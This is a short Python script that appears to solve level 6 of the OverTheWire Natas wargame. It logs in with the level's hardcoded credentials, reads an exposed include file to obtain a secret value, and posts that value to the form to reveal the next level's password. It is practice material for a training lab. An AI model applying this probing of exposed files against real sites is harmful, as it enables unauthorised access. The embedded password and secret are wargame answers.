import requests

url = 'http://natas6.natas.labs.overthewire.org/'
s = requests.Session()
s.auth = ('natas6', '0RoJwHdSKWFTYR5WuiAewauSuNaBXned')
r = s.get(url)
print(r.text)
print('--------------------------------------')
suburl = 'http://natas6.natas.labs.overthewire.org/includes/secret.inc'
r = s.get(suburl)
secret = 'FOEIUWGHFEEUHOFUOIU'
data = {'secret': secret,
        'submit': 'Submit+Query'
        }
print(r.text)
print('--------------------------------------')
r = s.post(url, data=data)
print(r.text)



